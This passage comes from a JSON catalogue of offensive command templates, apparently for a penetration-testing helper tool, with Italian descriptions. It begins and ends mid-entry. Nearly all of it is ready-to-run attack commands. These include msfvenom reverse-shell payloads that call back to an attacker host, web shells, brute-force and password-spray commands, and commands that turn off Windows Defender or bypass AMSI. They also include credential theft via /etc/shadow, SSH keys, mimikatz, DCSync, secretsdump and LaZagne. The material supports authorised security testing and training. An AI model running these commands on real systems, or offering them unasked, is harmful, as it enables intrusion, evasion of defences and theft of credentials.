      }
    ],
    "refs": [
      {
        "label": "HackTricks — SSRF",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html"
      }
    ]
  },
  {
    "id": "verb-tampering",
    "name": "HTTP Verb Tampering",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Access Control",
    "description": "Se GET su un’area protetta è bloccato, prova altri metodi: a volte l’autenticazione copre solo GET/POST e PUT/PATCH passano.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "verb-tampering",
      "access-control"
    ],
    "template": "curl -X PUT http://<ip>/admin/",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "PUT",
        "template": "curl -X PUT http://<ip>/admin/",
        "description": "Metodo alternativo non coperto dall’ACL."
      },
      {
        "id": "patch",
        "label": "PATCH",
        "template": "curl -X PATCH http://<ip>/admin/",
        "description": "Altro verbo da provare."
      },
      {
        "id": "options",
        "label": "OPTIONS",
        "template": "curl -i -X OPTIONS http://<ip>/admin/",
        "description": "Mostra i metodi permessi nell’header Allow."
      }
    ]
  },
  {
    "id": "idor",
    "name": "IDOR — object reference",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Access Control",
    "description": "Cambia un identificatore nella request per accedere a risorse di altri utenti. Cerca ID sequenziali in URL, parametri e body.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "idor",
      "access-control"
    ],
    "template": "GET /api/user/2   (originale: /api/user/1)",
    "params": []
  },
  {
    "id": "searchsploit",
    "name": "searchsploit — exploit noti",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Exploit Search",
    "description": "Cerca exploit pubblici per servizio e versione esatta. Leggi sempre il codice del PoC prima di lanciarlo.\n- `-x` = apri e leggi il PoC\n- `-m` = copia il PoC nella cartella corrente",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "searchsploit",
      "exploit-db",
      "cve"
    ],
    "template": "searchsploit <service> <version>",
    "params": [
      {
        "key": "service",
        "label": "Servizio",
        "placeholder": "apache"
      },
      {
        "key": "version",
        "label": "Versione",
        "placeholder": "2.4.49"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Cerca",
        "template": "searchsploit <service> <version>",
        "description": "Cerca per nome servizio e versione."
      },
      {
        "id": "examine",
        "label": "Leggi (-x)",
        "template": "searchsploit -x <path>",
        "description": "Apre il PoC per leggerne il codice."
      },
      {
        "id": "mirror",
        "label": "Copia (-m)",
        "template": "searchsploit -m <path>",
        "description": "Copia il PoC nella cartella corrente."
      }
    ],
    "note": "# Logica CVE\n- Identifica la versione esatta del servizio (`nmap -sV`, banner, pagina `/about`)\n- `searchsploit <service> <version>`\n- Cerca su Google/GitHub: `<service> <version> CVE PoC exploit`\n- Leggi il codice del PoC prima di eseguirlo: capisci cosa fa\n- Adatta i parametri (IP, porta, path) e lancia",
    "refs": [
      {
        "label": "Exploit-DB — SearchSploit",
        "url": "https://www.exploit-db.com/searchsploit"
      }
    ]
  },
  {
    "id": "nuclei",
    "name": "nuclei — scanner a template",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Scanners",
    "description": "Scanner basato su template per CVE e misconfiguration note.\n- `-tags cve` = limita ai template dei CVE\n- `-o` = salva sempre l'output su file",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nuclei",
      "scanner",
      "cve"
    ],
    "template": "nuclei -u http://<ip> -o nuclei.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Full",
        "template": "nuclei -u http://<ip> -o nuclei.txt",
        "description": "Tutti i template applicabili."
      },
      {
        "id": "cve",
        "label": "Solo CVE",
        "template": "nuclei -u http://<ip> -tags cve -o nuclei_cve.txt",
        "description": "Limita ai template taggati cve."
      }
    ]
  },
  {
    "id": "nikto",
    "name": "nikto — web vuln scan",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Scanners",
    "description": "Scanner web veloce per file pericolosi, header e misconfiguration. Rumoroso: usalo quando lo stealth non conta.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nikto",
      "scanner"
    ],
    "template": "nikto -h http://<ip> -o nikto.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "msfvenom",
    "name": "msfvenom — genera payload",
    "category": "exploitation",
    "subcategory": "payloads",
    "group": "Reverse Shells",
    "description": "Genera una reverse shell standalone nel formato adatto al target:\n- `.elf` = Linux\n- `.exe`/`.dll` = Windows\n- `.war` = Tomcat\n- `.aspx` = IIS\n- `.msi` = AlwaysInstallElevated\n- `.hta` = social engineering",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "msfvenom",
      "payload",
      "reverse-shell"
    ],
    "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux ELF",
        "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
        "description": "Binario Linux: ricorda `chmod +x shell.elf` prima di eseguirlo."
      },
      {
        "id": "exe",
        "label": "Windows EXE",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
        "description": "Eseguibile Windows x64."
      },
      {
        "id": "dll",
        "label": "Windows DLL",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o evil.dll",
        "description": "Per DLL hijacking / sideloading."
      },
      {
        "id": "war",
        "label": "WAR (Tomcat)",
        "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war",
        "description": "Da caricare sul Tomcat Manager."
      },
      {
        "id": "aspx",
        "label": "ASPX (IIS)",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx -o shell.aspx",
        "description": "Web shell per IIS / ASP.NET."
      },
      {
        "id": "msi",
        "label": "MSI",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o shell.msi",
        "description": "Per abusare di AlwaysInstallElevated (`msiexec /quiet /i shell.msi`)."
      },
      {
        "id": "hta",
        "label": "HTA",
        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f hta-psh -o shell.hta",
        "description": "HTML Application per social engineering."
      }
    ]
  },
  {
    "id": "nc-listen",
    "name": "nc — listener",
    "category": "exploitation",
    "subcategory": "listeners",
    "group": "Netcat",
    "description": "Listener TCP per ricevere la reverse shell. `rlwrap` aggiunge frecce e history alla shell ricevuta.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "nc",
      "listener"
    ],
    "template": "rlwrap nc -lvnp <lport>",
    "params": [
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "rlwrap",
        "template": "rlwrap nc -lvnp <lport>",
        "description": "Con `rlwrap`: frecce e history nella shell."
      },
      {
        "id": "plain",
        "label": "Plain",
        "template": "nc -lvnp <lport>",
        "description": "Netcat semplice."
      }
    ]
  },
  {
    "id": "msf-handler",
    "name": "msfconsole — multi/handler",
    "category": "exploitation",
    "subcategory": "listeners",
    "group": "Metasploit",
    "description": "Handler Metasploit per payload `meterpreter` o staged. Il payload del handler deve combaciare con quello generato.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "metasploit",
      "handler",
      "meterpreter"
    ],
    "template": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <lhost>; set LPORT <lport>; run\"",
    "params": [
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ]
  },
  {
    "id": "kali-webshells",
    "name": "Web shell preinstallate (Kali)",
    "category": "exploitation",
    "subcategory": "webshells",
    "group": "Percorsi Kali",
    "description": "Web shell già presenti su Kali, da caricare via file upload o LFI. Imposta `LHOST`/`LPORT` dentro `php-reverse-shell.php` prima di usarla.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "webshell",
      "kali",
      "laudanum",
      "nishang"
    ],
    "template": "/usr/share/webshells/php/php-reverse-shell.php",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "PHP reverse",
        "template": "/usr/share/webshells/php/php-reverse-shell.php",
        "description": "Reverse shell PHP (modifica IP/porta nel file)."
      },
      {
        "id": "backdoor",
        "label": "PHP backdoor",
        "template": "/usr/share/webshells/php/simple-backdoor.php",
        "description": "Web shell `?cmd=` minimale."
      },
      {
        "id": "laudanum",
        "label": "Laudanum",
        "template": "/usr/share/webshells/laudanum/",
        "description": "Collezione PHP/ASP/ASPX/JSP."
      },
      {
        "id": "nishang",
        "label": "Nishang Antak",
        "template": "/usr/share/nishang/Antak-WebShell/",
        "description": "Web shell PowerShell (ASPX)."
      }
    ]
  },
  {
    "id": "username-anarchy",
    "name": "username-anarchy — genera username",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Username List",
    "description": "Genera username plausibili da nomi/cognomi (`nome.cognome`, `n.cognome`, `ncognome`…). Da una lista di nomi reali ottieni la userlist per spray/brute.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "username-anarchy",
      "userlist"
    ],
    "template": "username-anarchy -i names.txt",
    "params": []
  },
  {
    "id": "hydra",
    "name": "hydra — brute force online",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Online Brute",
    "description": "Brute force online di un servizio. Ultima risorsa (rumoroso, rischio lockout): prima prova spray e password riutilizzate.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "hydra",
      "brute"
    ],
    "template": "hydra -l <user> -P <wordlist> ssh://<ip> -t 4",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SSH",
        "template": "hydra -l <user> -P <wordlist> ssh://<ip> -t 4",
        "description": "`-t 4`: SSH spesso limita i thread paralleli."
      },
      {
        "id": "ftp",
        "label": "FTP",
        "template": "hydra -l <user> -P <wordlist> ftp://<ip>",
        "description": "Brute FTP."
      },
      {
        "id": "http-post",
        "label": "HTTP POST form",
        "template": "hydra -l <user> -P <wordlist> <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\"",
        "description": "`F=` è la stringa che il server mostra al login fallito."
      },
      {
        "id": "http-basic",
        "label": "HTTP Basic",
        "template": "hydra -l <user> -P <wordlist> <ip> http-get /protected/",
        "description": "Autenticazione HTTP Basic."
      }
    ]
  },
  {
    "id": "nxc-smb-spray",
    "name": "nxc smb — password spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Spraying",
    "description": "Prova una password su tutta la userlist. **Verifica prima la lockout policy** (`--pass-pol`): se la soglia è >0, un solo tentativo per giro. `--continue-on-success` non si ferma al primo successo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "spray"
    ],
    "template": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "Winter2025!"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Una password",
        "template": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success",
        "description": "Una password su tutti gli utenti."
      },
      {
        "id": "list",
        "label": "Lista password",
        "template": "nxc smb <ip> -u <userlist> -p passwords.txt --no-bruteforce --continue-on-success",
        "description": "`--no-bruteforce` accoppia riga-a-riga utente:password invece di tutte le combinazioni."
      },
      {
        "id": "winrm",
        "label": "WinRM",
        "template": "nxc winrm <ip> -u <userlist> -p passwords.txt --continue-on-success",
        "description": "Stesso spray ma su WinRM."
      }
    ]
  },
  {
    "id": "hashcat-ntlm",
    "name": "hashcat — crack hash offline",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Hash Cracking",
    "description": "Cracking offline degli hash. `--show` ristampa quelli già craccati.\n- `1000` = NTLM\n- `13100` = Kerberoast (TGS)\n- `18200` = AS-REP\n- `5600` = NetNTLMv2",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashcat",
      "cracking"
    ],
    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
    "params": [
      {
        "key": "mode",
        "label": "Mode",
        "placeholder": "1000"
      },
      {
        "key": "hashfile",
        "label": "Hash file",
        "placeholder": "hashes.txt"
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ],
    "refs": [
      {
        "label": "hashcat — example hashes (lista mode)",
        "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
      },
      {
        "label": "Weakpass — wordlist per cracking",
        "url": "https://weakpass.com/"
      }
    ]
  },
  {
    "id": "john-2john",
    "name": "john — *2john + crack",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Hash Cracking",
    "description": "Estrai l’hash da un file protetto con uno script `*2john`, poi craccalo. \n`locate *2john*` per vederli tutti.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "john",
      "2john",
      "cracking"
    ],
    "template": "ssh2john id_rsa > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "SSH key",
        "template": "ssh2john id_rsa > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Passphrase di una chiave SSH privata."
      },
      {
        "id": "zip",
        "label": "ZIP",
        "template": "zip2john file.zip > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Archivio ZIP protetto."
      },
      {
        "id": "keepass",
        "label": "KeePass",
        "template": "keepass2john file.kdbx > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Database KeePass `.kdbx`."
      },
      {
        "id": "office",
        "label": "Office",
        "template": "office2john file.docx > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "Documento Office protetto."
      },
      {
        "id": "pdf",
        "label": "PDF",
        "template": "pdf2john file.pdf > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        "description": "PDF protetto da password."
      }
    ]
  },
  {
    "id": "kerbrute-spray",
    "name": "kerbrute — password spray",
    "category": "exploitation",
    "subcategory": "cred-attacks",
    "group": "Spraying",
    "description": "Spray via Kerberos: genera eventi `4768`/`4771` ma non `4625` (failed logon), quindi più stealth. Con un tentativo per giro non blocca gli account.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "kerbrute",
      "spray"
    ],
    "template": "kerbrute passwordspray -d <domain> --dc <ip> <userlist> '<password>'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "Winter2025!"
      }
    ]
  },
  {
    "id": "shell-pty",
    "name": "Stabilizza shell (PTY)",
    "category": "exploitation",
    "subcategory": "shell-stab",
    "group": "TTY Upgrade",
    "description": "Trasforma una shell grezza in una TTY interattiva (Ctrl+C, history, editor). La sequenza completa è nella variante apposita.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pty",
      "tty",
      "upgrade"
    ],
    "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Python PTY",
        "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "description": "Primo passo: spawn di una `bash` con PTY."
      },
      {
        "id": "full",
        "label": "Upgrade completo",
        "template": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm",
        "description": "Dopo lo spawn: `Ctrl+Z`, poi `stty raw -echo; fg`, infine `export TERM=xterm` per una TTY piena."
      },
      {
        "id": "script",
        "label": "script",
        "template": "script /dev/null -c bash",
        "description": "Alternativa se manca Python."
      },
      {
        "id": "langs",
        "label": "Altri linguaggi",
        "template": "perl -e 'exec \"/bin/sh\";'",
        "description": "Se manca Python: anche `ruby`/`lua`/`awk` con un `exec \"/bin/sh\"`."
      }
    ]
  },
  {
    "id": "av-defender",
    "name": "Defender — disattiva / AMSI bypass",
    "category": "exploitation",
    "subcategory": "av-bypass",
    "group": "Defender & AMSI",
    "description": "Riduci le difese prima di caricare i tool. Disattivare il real-time o escludere un path richiede admin; l’AMSI bypass gira in memoria e va eseguito PRIMA di caricare lo script.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "defender",
      "amsi",
      "av-bypass"
    ],
    "template": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Disattiva real-time",
        "template": "Set-MpPreference -DisableRealtimeMonitoring $true",
        "description": "Spegne la protezione in tempo reale (serve admin). Rumoroso."
      },
      {
        "id": "exclude",
        "label": "Escludi path",
        "template": "Add-MpPreference -ExclusionPath \"C:\\Temp\"",
        "description": "Esclude una cartella dalla scansione: caricaci i tool."
      },
      {
        "id": "amsi",
        "label": "AMSI bypass",
        "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "description": "Disabilita AMSI in memoria; eseguilo prima di caricare script PowerShell. 🚩 firmato dai SIEM."
      }
    ]
  },
  {
    "id": "sa-linux-who",
    "name": "Linux — chi sono / sistema",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "Identità, host e fingerprint OS: punto di partenza per capire dove sei e cosa puoi diventare.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "situational-awareness"
    ],
    "template": "id; whoami; hostname; uname -a; cat /etc/os-release",
    "params": []
  },
  {
    "id": "sa-linux-net",
    "name": "Linux — rete",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "IP, route, ARP e socket in ascolto: trova servizi locali e altre reti raggiungibili (pivot).",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "network"
    ],
    "template": "ip a; ip route; arp -a; ss -tlnp; cat /etc/hosts",
    "params": []
  },
  {
    "id": "sa-linux-users",
    "name": "Linux — utenti & processi",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Linux",
    "description": "Utenti con shell valida, login recenti e processi: cerca servizi che girano come root o come altri utenti.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "users",
      "processes"
    ],
    "template": "grep -vE \"nologin|false\" /etc/passwd; w; last; ps auxf",
    "params": []
  },
  {
    "id": "sa-win-who",
    "name": "Windows — whoami /all",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Privilegi, gruppi e SID del token. Guarda i privilegi (`SeImpersonatePrivilege`…) e i gruppi locali.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "situational-awareness"
    ],
    "template": "whoami /all & net localgroup Administrators",
    "params": []
  },
  {
    "id": "sa-win-sys",
    "name": "Windows — sistema & rete",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Info di sistema con `systeminfo` (input per il Windows Exploit Suggester), più IP, connessioni e share locali.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "systeminfo",
      "network"
    ],
    "template": "systeminfo & ipconfig /all & netstat -ano & net share",
    "params": []
  },
  {
    "id": "sa-win-domain",
    "name": "Windows — dominio (net)",
    "category": "post-exp",
    "subcategory": "situational-awareness",
    "group": "Windows",
    "description": "Enumera utenti e gruppi di dominio con i comandi `net` classici (se la macchina è joinata).",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "net",
      "domain"
    ],
    "template": "net user /domain & net group \"Domain Admins\" /domain & nltest /dclist:<domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ]
  },
  {
    "id": "creds-linux",
    "name": "Linux — caccia credenziali",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Linux",
    "description": "Dove si nascondono le credenziali su Linux: `/etc/shadow`, chiavi SSH, history, config web, variabili d’ambiente.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "credentials",
      "linux"
    ],
    "template": "find / \\( -name id_rsa -o -name id_ed25519 -o -name authorized_keys \\) 2>/dev/null",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "SSH keys",
        "template": "find / \\( -name id_rsa -o -name id_ed25519 -o -name authorized_keys \\) 2>/dev/null",
        "description": "Chiavi private e `authorized_keys`."
      },
      {
        "id": "shadow",
        "label": "Shadow",
        "template": "cat /etc/shadow",
        "description": "Hash delle password (serve root)."
      },
      {
        "id": "history",
        "label": "History",
        "template": "cat /home/*/.bash_history /root/.bash_history /home/*/.mysql_history 2>/dev/null",
        "description": "Comandi passati: spesso password in chiaro."
      },
      {
        "id": "configs",
        "label": "Config web",
        "template": "cat /var/www/html/wp-config.php /var/www/html/.env /var/www/html/config.php 2>/dev/null",
        "description": "`wp-config.php`, `.env`, `config.php` contengono credenziali DB."
      },
      {
        "id": "env",
        "label": "Env & token",
        "template": "env | grep -i \"key\\|token\\|secret\\|pass\"",
        "description": "Segreti nelle variabili d’ambiente."
      }
    ]
  },
  {
    "id": "mimikatz-logonpw",
    "name": "mimikatz — dump da LSASS",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Estrae password, hash, ticket e segreti da memoria/registro. Serve SYSTEM o admin con `SeDebugPrivilege`.  Molto rumoroso.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "mimikatz",
      "lsass",
      "credentials"
    ],
    "template": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "logonpasswords",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "description": "Password/hash in chiaro dalla memoria LSASS."
      },
      {
        "id": "sam",
        "label": "lsadump::sam",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
        "description": "Hash degli account locali (SAM)."
      },
      {
        "id": "lsa",
        "label": "lsadump::lsa",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"",
        "description": "LSA secrets (service account, cached)."
      },
      {
        "id": "dcsync",
        "label": "DCSync",
        "template": ".\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /user:Administrator\" \"exit\"",
        "description": "Estrae l’hash di un utente dal DC via replica (serve DA o diritti DCSync)."
      }
    ]
  },
  {
    "id": "secretsdump",
    "name": "secretsdump.py — dump remoto",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Dump di SAM/LSA/NTDS via RPC. `-just-dc-ntlm` estrae solo gli hash NTLM del dominio (conferma rapida DA).",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc",
      "dcsync"
    ],
    "tags": [
      "impacket",
      "secretsdump",
      "dcsync"
    ],
    "template": "impacket-secretsdump <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "NTLM hash",
        "template": "impacket-secretsdump <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash (niente password)."
      },
      {
        "id": "ntdsonly",
        "label": "Just DC NTLM",
        "template": "impacket-secretsdump <domain>/<user>:<password>@<ip> -just-dc-ntlm",
        "description": "Solo hash NTLM dal NTDS del DC."
      },
      {
        "id": "local",
        "label": "LOCAL (SAM offline)",
        "template": "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
        "description": "Su dump registro salvati con `reg save HKLM\\SAM ...`."
      }
    ]
  },
  {
    "id": "lazagne",
    "name": "LaZagne — credenziali salvate",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Recupera credenziali salvate ovunque: browser, Wi-Fi, mail, client DB.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "lazagne"
    ],
    "template": ".\\lazagne.exe all",
    "params": []
  },
  {
    "id": "pypykatz",
    "name": "pypykatz — parse dump LSASS",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Mimikatz in Python: estrae credenziali da un dump LSASS offline (`procdump -ma lsass.exe lsass.dmp`), senza lanciare mimikatz sul target.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pypykatz",
      "lsass"
    ],
    "template": "pypykatz lsa minidump lsass.dmp",
    "params": []
  },
  {
    "id": "win-creds-misc",
    "name": "Windows — credenziali varie",
    "category": "post-exp",
    "subcategory": "cred-harvesting",
    "group": "Windows",
    "description": "Credenziali fuori da LSASS: Credential Manager, history PowerShell, autologon nel registro.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "cmdkey",
      "autologon",
      "credentials"
    ],
    "template": "cmdkey /list",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Credential Manager",
        "template": "cmdkey /list",
        "description": "Elenca le credenziali salvate; per riusarne una vedi la variante `runas /savecred`."
      },
      {
        "id": "runas",
        "label": "runas /savecred",
        "template": "runas /savecred /user:<user> cmd.exe",
        "description": "Riusa una credenziale salvata (vista con `cmdkey /list`): esegue un comando come quell'utente senza conoscerne la password."
      },
      {
        "id": "pshistory",
        "label": "PS history",
        "template": "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "description": "Comandi PowerShell passati."
      },
      {
        "id": "autologon",
        "label": "Autologon",
        "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"DefaultUserName DefaultPassword AutoAdminLogon\"",
        "description": "Password di autologon in chiaro nel registro."
      }
    ]
  },
  {
    "id": "pillage-files",
    "name": "Caccia file sensibili",
    "category": "post-exp",
    "subcategory": "pillaging",
    "group": "File locali",
    "description": "Cerca file interessanti sul filesystem: KeePass, backup, repo git, file unattended, web.config.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "pillaging",
      "find"
    ],
    "template": "find / \\( -name \"*.kdbx\" -o -name \"*.bak\" -o -name \".git\" \\) 2>/dev/null",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Linux",
        "template": "find / \\( -name \"*.kdbx\" -o -name \"*.bak\" -o -name \".git\" \\) 2>/dev/null",
        "description": "KeePass, backup, repo git."
      },
      {
        "id": "windows",
        "label": "Windows",
        "template": "dir /s /b C:\\*unattend*.xml C:\\*web.config* C:\\*.kdbx 2>nul",
        "description": "File di risposta, `web.config`, KeePass."
      },
      {
        "id": "findstr",
        "label": "Windows findstr",
